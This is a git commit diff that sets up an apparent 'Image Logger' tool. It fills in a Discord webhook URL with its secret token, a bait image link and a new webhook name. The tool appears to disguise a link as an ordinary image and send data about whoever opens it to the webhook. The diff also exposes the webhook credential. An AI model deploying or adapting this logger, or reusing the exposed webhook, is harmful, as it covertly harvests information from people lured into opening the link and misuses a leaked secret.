2b6f6f523e12474359ff125d6ef85d5fbbfdc23d
Bland™ <molepro1234512345@gmail.com>
2026-02-14 10:23:02 -0800

    Update webhook URL and image URL in config

--- api/image.py
+++ api/image.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "Webohook here my boy",
-    "image": "image.url here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1472296703964217426/NX197qQLfl5YQJRkwEDhzq4xeqFaNzb-FVrxNVZ7yO6vPwAS1JZuUiHQSCiRoUKbHlMK",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWmB2njeUXsPwGDgFVdR5-Xn1MQJN28Hblbw&s.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "ImgaeHibye", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
